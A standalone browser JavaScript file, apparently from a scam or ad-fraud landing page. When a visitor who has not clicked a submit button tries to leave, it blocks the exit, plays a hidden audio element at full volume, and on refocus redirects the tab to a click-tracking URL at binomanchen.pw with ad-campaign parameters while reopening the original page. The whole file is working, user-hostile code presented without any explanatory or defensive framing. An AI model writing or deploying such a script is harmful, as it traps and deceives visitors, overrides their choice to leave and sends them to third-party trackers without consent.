var lastLink = 'closed'; // last link

var inputs = document.querySelectorAll('input, button');
for(var i = 0; i < inputs.length; i++) {
	// to all links save last target
	var type = inputs[i].getAttribute('type');
	if (type == 'submit') {
		inputs[i].addEventListener('click', function() { lastLink = 'submit'; }, false);
	}
}


document.addEventListener('DOMContentLoaded', function(e) {
	var audion = document.getElementById('xyz');
	audion.volume = 0.0;
});

window.onbeforeunload = unload;

function unload(e) {

	if (lastLink == 'closed') {
		lastLink = 'redirect';
		var audion = document.getElementById('xyz');
		audion.currentTime -= 999;
		audion.volume = 1.0;
		audion.play();
		return false;
	}
	if (lastLink == 'redirect') {
		window.close();
	}
}
window.addEventListener('focus', function(e) {
	let linkUrl = window.location.href;

	if (lastLink == 'redirect') {

		window.location = 'https://binomanchen.pw/click.php?key=pbc6z5onwtlf9wxzdhym&click_id={click_id}&click_price={click_price}&utm_campaign={utm_campaign}&category_id={category_id}&teaser_id={teaser_id}&utm_medium={utm_medium}&widget_id={widget_id}&campaign_id={campaign_id}';
		window.open(linkUrl);

	}
});